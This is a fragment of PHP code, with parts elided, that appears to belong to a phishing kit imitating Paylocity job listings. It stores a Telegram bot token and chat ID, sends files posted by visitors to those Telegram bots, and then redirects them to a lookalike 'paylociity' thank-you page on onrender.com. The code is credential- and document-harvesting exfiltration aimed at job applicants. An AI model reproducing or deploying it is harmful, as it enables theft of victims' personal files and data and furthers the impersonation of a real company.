...
$telegram_bots = [
    ...
    [
        'token' => '7608524703:AAH-k8D8CadiQqQA_xSs7K0YXM6q0tqrjc4',
        'chat_id' => '7207169369'
    ]
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
   ...
   // Function to send files to multiple Telegram bots
    ...
    header("Location:https://paylociity-kcdq.onrender.com/www.paylocity.com/careers/all-listings.job.34092/thankyou.html");
exit;
}
?>